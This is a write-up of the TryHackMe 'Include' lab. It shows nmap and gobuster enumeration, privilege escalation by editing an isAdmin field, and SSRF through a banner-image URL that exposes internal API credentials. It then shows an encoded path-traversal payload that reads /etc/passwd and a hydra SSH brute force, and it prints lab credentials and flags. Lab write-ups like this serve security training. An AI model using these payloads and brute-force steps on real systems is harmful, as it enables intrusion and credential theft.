# Room: Include

## General Info
- **Room link:** [Include](https://tryhackme.com/room/include)

## Description

This challenge is an initial test to evaluate your capabilities in web pentesting, particularly for server-side attacks. Start the VM by clicking the Start Machine button at the top right of the task.

You will find all the necessary tools to complete the challenge, like Nmap, PHP shells, and many more on the AttackBox.

## Provided Files / Links
- [x] Target Machine IP (10.10.4.215)

## Enumeration / Recon

- Port Enumeration:
` nmap -sV 10.10.4.215 -p- -T5`

```
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
25/tcp    open  smtp     Postfix smtpd
110/tcp   open  pop3     Dovecot pop3d
143/tcp   open  imap     Dovecot imapd (Ubuntu)
993/tcp   open  ssl/imap Dovecot imapd (Ubuntu)
995/tcp   open  ssl/pop3 Dovecot pop3d
4000/tcp  open  http     Node.js (Express middleware)
50000/tcp open  http     Apache httpd 2.4.41 ((Ubuntu))
```

Note: 
2 http ports (4000 and 50000)

- Directory Enumeration

I start enumerating on port 50000 (this is a sysmon login page):

```
gobuster dir -u http://10.10.4.215:50000 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100
```

```
/uploads              (Status: 301) [Size: 321] [--> http://10.10.4.215:50000/uploads/]
/javascript           (Status: 301) [Size: 324] [--> http://10.10.4.215:50000/javascript/]
/templates            (Status: 301) [Size: 323] [--> http://10.10.4.215:50000/templates/]
/phpmyadmin           (Status: 403) [Size: 279]
/server-status        (Status: 403) [Size: 279]
```

And on port 4000 (this is a login page):

```
gobuster dir -u http://10.10.4.215:4000 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100
```

```
/index                (Status: 302) [Size: 29] [--> /signin]
/signup               (Status: 500) [Size: 1246]
/images               (Status: 301) [Size: 179] [--> /images/]
/Index                (Status: 302) [Size: 29] [--> /signin]
/signin               (Status: 200) [Size: 1295]
/fonts                (Status: 301) [Size: 177] [--> /fonts/]
/INDEX                (Status: 302) [Size: 29] [--> /signin]
/Signup               (Status: 500) [Size: 1246]
/SignUp               (Status: 500) [Size: 1246]
/signUp               (Status: 500) [Size: 1246]
/SignIn               (Status: 200) [Size: 1295]
```

In the /signin page, I can login with the credentials guest:guest.

## Website exploitation

### Friends website

Once logged in, I can see my profile and 2 "friend" profiles.
In my profile, there is a "Friend Details section" with an "isAdmin" propriety set to false.

With the form at the bottom of the page, I can change the value of the property simply by entering "isAdmin" and "true" in the 2 fields.

I notice that now I have access to another page: `http://10.10.4.215:4000/admin/api`.

In this page, I am informed of the 2 following api endpoints:

```
Internal API
GET http://127.0.0.1:5000/internal-api HTTP/1.1
Host: 127.0.0.1:5000

Response:
{
  "secretKey": "superSecretKey123",
  "confidentialInfo": "This is very confidential."
}
```

```
Get Admins API
GET http://127.0.0.1:5000/getAllAdmins101099991 HTTP/1.1
Host: 127.0.0.1:5000

Response:
{
    "ReviewAppUsername": "admin",
    "ReviewAppPassword": "xxxxxx",
    "SysMonAppUsername": "administrator",
    "SysMonAppPassword": "xxxxxxxxx",
}
```

In the http://10.10.4.215:4000/admin/settings page, there is a field to "Update Banner Image URL". I try my luck with the admins API endpoint that I found a minute ago and I get the following string:

`data:application/json; charset=utf-8;base64,eyJSZXZpZXdBcHBVc2VybmFtZSI6ImFkbWluIiwiUmV2aWV3QXBwUGFzc3dvcmQiOiJhZG1pbkAhISEiLCJTeXNNb25BcHBVc2VybmFtZSI6ImFkbWluaXN0cmF0b3IiLCJTeXNNb25BcHBQYXNzd29yZCI6IlMkOSRxazZkIyoqTFFVIn0=`

I decode the base64 string part and get the following information:

```
{"ReviewAppUsername":"admin","ReviewAppPassword":"admin@!!!","SysMonAppUsername":"administrator","SysMonAppPassword":"S$9$qk6d#**LQU"}
```

### Sysmon website

Now that I got the SysMonAppUsername/SysMonAppPassword credentials, I can login the sysmon website.

Once I'm logged in, I find the first flag right away: **THM{!50_55Rf_1S_d_k3Y??!}**.

Then I spent a lot of time trying to find what the next step would be.

I found in the html source code a piece of information related to the image that is displayed: 

`<img src="profile.php?img=profile.png" class="img-fluid rounded-circle mb-3 profile-pic" alt="User Profile Picture">`

I opened Burp Suite to try for LFI poisoning. I found a relevant wordlist to use in my SecLists repository (/usr/share/wordlists/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt) and started the attack in the intruder tab:

```
GET /profile.php?img=§profile.png§ HTTP/1.1
Host: 10.10.4.215:50000
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Referer: http://10.10.4.215:50000/dashboard.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=9ve08gnsbsa4fqb2igoa98qent
Connection: keep-alive
```

With the following payload, I was able to read the content of the /etc/passwd file:

```
%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2fetc%2fpasswd
```

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
ec2-instance-connect:x:112:65534::/nonexistent:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
tryhackme:x:1001:1001:,,,:/home/tryhackme:/bin/bash
mysql:x:113:119:MySQL Server,,,:/nonexistent:/bin/false
postfix:x:114:121::/var/spool/postfix:/usr/sbin/nologin
dovecot:x:115:123:Dovecot mail server,,,:/usr/lib/dovecot:/usr/sbin/nologin
dovenull:x:116:124:Dovecot login user,,,:/nonexistent:/usr/sbin/nologin
joshua:x:1002:1002:,,,:/home/joshua:/bin/bash
charles:x:1003:1003:,,,:/home/charles:/bin/bash
```

I found 2 usernames: **joshua** and **charles**.

### SSH exploitation

Since I couldn't find passwords for joshua and charles, I will try to bruteforce the ssh login using hydra.

I'm first starting with joshua: `hydra -l joshua -P /usr/share/wordlists/rockyou.txt 10.10.4.215 ssh`.

I quickly found his password: `[22][ssh] host: 10.10.4.215   login: joshua   password: 123456`.

I did the same for charles and I actually found the exact same password (**123456**).

I logged in with joshua's credentials and went to /var/www/html. I listed all the files and found 505eb0fb8a9f32853b4d955e1f9123ea.txt which revealed the last flag: **THM{505eb0fb8a9f32853b4d955e1f9123ea}**.